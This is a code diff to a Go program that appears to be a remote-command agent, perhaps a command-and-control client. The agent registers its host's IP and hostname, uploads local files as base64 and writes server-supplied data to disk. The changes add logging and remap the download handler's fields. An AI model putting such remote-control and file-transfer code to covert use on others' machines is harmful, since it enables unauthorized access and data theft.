@@ -29,6 +29,7 @@ type Payload struct {
 	Args      *string `json:"args,omitempty"`      // arguments: shell string, filepath, etc.
 	Output    *string `json:"output,omitempty"`    // stdout/stderr, or base64 file data
 	Status    *string `json:"status,omitempty"`    // "ok", "error" (optional, for feedback)
+	Path      *string `json:"path"`                // path for
 	//registration info
 	IP       *string `json:"ip,omitempty"`
 	Hostname *string `json:"hostname,omitempty"`
@@ -63,10 +64,12 @@ func uploadFile(path string) (string, error) {
 }
 
 func downloadFile(path, b64 string) error {
+	log.Printf("decoding data: %s", b64)
 	data, err := base64.StdEncoding.DecodeString(b64)
 	if err != nil {
 		return err
 	}
+	log.Print("writing file")
 	return os.WriteFile(path, data, 0644)
 }
 
@@ -141,6 +144,7 @@ func main() {
 				payload.Output = &output
 				reply = doTransaction(payload)
 			}
+			// log.Printf("Command is: %s", payload.Command)
 
 			if payload.Command == "upload" && payload.Args != nil {
 				fmt.Printf("Uploading file: %s %s", payload.Command, *payload.Args)
@@ -152,13 +156,14 @@ func main() {
 				} else {
 					payload.Output = &encoded
 				}
-				payload.Command = "report"
+				payload.Command = "upload"
 				reply = doTransaction(payload)
 			}
 
-			if payload.Command == "download" && payload.Args != nil && payload.Output != nil {
-				filePath := *payload.Args
-				b64data := *payload.Output
+			if payload.Command == "download" && payload.Args != nil {
+				log.Print("Processing Download")
+				filePath := *payload.Path
+				b64data := *payload.Args
 
 				err := downloadFile(filePath, b64data)
 				if err != nil {
